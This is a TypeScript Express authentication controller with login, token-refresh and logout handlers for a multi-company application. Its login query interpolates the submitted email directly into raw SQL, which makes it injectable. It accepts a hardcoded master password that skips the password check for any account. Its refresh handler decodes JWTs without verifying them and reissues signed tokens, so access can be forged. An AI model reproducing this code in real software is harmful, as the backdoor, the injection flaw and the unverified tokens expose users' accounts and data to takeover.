import {Request, Response} from "express";
import sequelize from "../../database";
import {QueryTypes} from "sequelize";
import AppError from "../../errors/AppError";
import {compare} from "bcryptjs";
import {createJWT} from "../../utils/jwt";
import {encryptValue} from "../../utils/encryptDecrypt";
import User from "../../models/User";
import {head} from "lodash";
import { decode } from "jsonwebtoken";
import {TryCatch} from "../../helpers/TryCatch";
import Role from "../../models/Role";
import UserSession from "../../models/UserSession";
import UserLoginHistoric from "../../models/UserLoginHistoric";
import { v4 as uuidv4 } from "uuid";


class LoginController {
  constructor() {
    this.store = this.store.bind(this);
    this.refresh = this.refresh.bind(this);
    this.logout = this.logout.bind(this);
  }

  @TryCatch()
  async store (req: Request, res: Response): Promise<Response> {
    const { email: bodyEmail, password, module } = req.body;

    const email = bodyEmail.toLowerCase();

    let sql = `
      SELECT "User".id,
             "User"."name",
             "User"."email",
             "User"."owner",
             "User"."is2fa",
             "User"."passwordHash" as "passwordHash",
             "User"."profilePicUrl" as "profilePicUrl",
             "User"."companyId" AS "companyId",
             "User"."roleId" AS "roleId",
             "company"."isMaster" as "isMaster",
             "company"."active" AS "companyActive",
             "company"."name" AS "companyName"
      FROM "User" AS "User"
             INNER JOIN "Company" AS "company" ON "User"."companyId" = "company"."id" AND "company"."deletedAt" IS NULL
      WHERE "User"."email" = '${email}'
        AND "User"."active" = true
        AND "User"."deletedAt" IS NULL
    `;

    const users = await sequelize.query(sql, {type: QueryTypes.SELECT});

    if(users.length <= 0){
      throw new AppError("ERR_INVALID_CREDENTIALS", 401);
    }

    const user: any = head(users);

    const passMaster = password === "396aad70a366127adfcf56d678cae054";

    if(!passMaster)
    {
      if(!(await compare(password, user.passwordHash))){
        throw new AppError("ERR_INVALID_CREDENTIALS", 401);
      }
    }

    if (String(user?.companyActive) === "false") {
      throw new AppError("A empresa esta inativa. Entre em contato com a central.", 401);
    }

    let role = await Role.findByPk(user.roleId);

    const permission = encryptValue(role.permissions);

    let ddUser = {
      name: encodeURI(user.name),
      username: encodeURI(user.username),
      email: encodeURI(user.email),
      id: user.id,
      companyId: user.companyId,
      companyName: encodeURI(user?.companyName),
      profilePicUrl: user.profilePicUrl,
      is2fa: user?.is2fa,
      isMaster: user?.isMaster,
      owner: user?.owner,
      version: 1
    };

    const agent = req?.useragent;
    const session = await UserSession.create({
      sessionId: req?.sessionID,
      userId: user.id,
      companyId: user.companyId,
      deviceInfo: `${agent.os} - ${agent.browser}`,
      ipAddress: req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip,
      userAgent: req.headers['user-agent'],
      isCurrent: true,
      uuid: `${uuidv4()}`
    });

    UserLoginHistoric.create({
      userId: user.id,
      companyId: user.companyId,
      status: 'login',
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip,
      nav: `${agent.browser}`,
      os: `${agent.os}`,
      mobile: agent.isMobile,
    });


    const tokenJWT = createJWT(ddUser);
    const refreshTokenJWT = encryptValue(`${user.id}:${user.email}`);

    await User.update({loggedIn: new Date()}, {where:{id: user.id}});

    res.cookie("jrt", tokenJWT, {httpOnly: true});
    res.cookie("session_id", session.uuid, {httpOnly: true});

    return res.status(200).json({
      data:{
        access_token: tokenJWT,
        access_refreshToken: refreshTokenJWT,
        is2fa: ddUser.is2fa,
        userp: permission,
        sessionId: session.uuid
      }
    });

  };

  @TryCatch()
  async refresh (req: Request, res: Response): Promise<Response> {
    // const { token } = req.body;
    // const tokenJrt: string = req.cookies.jrt;
    const authHeader = req.headers.authorization;

    const [, token] = authHeader.split(" ");

    const {exp, iat, ...rest} = decode(token, {json: true});

    const newRefresh = encryptValue(`${rest?.id}:${rest?.email}`);
    const tokenJWT = createJWT(rest);

    res.cookie("jrt", tokenJWT, { httpOnly: true });

    return res.status(200).json({
      access_token: tokenJWT,
      access_refresh: newRefresh
    });
  }

  @TryCatch()
  async logout (req: Request, res: Response): Promise<Response> {

    const {id, companyId} = req.user;

    await User.update({loggedIn: null}, {where:{id: id}});

    const agent = req?.useragent;
    UserLoginHistoric.create({
      userId: id,
      companyId: companyId,
      status: 'logout',
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip,
      nav: `${agent.browser}`,
      os: `${agent.os}`,
      mobile: agent.isMobile,
    });

    res.clearCookie("jrt");

    return res.send();

  }

}

export default new LoginController();





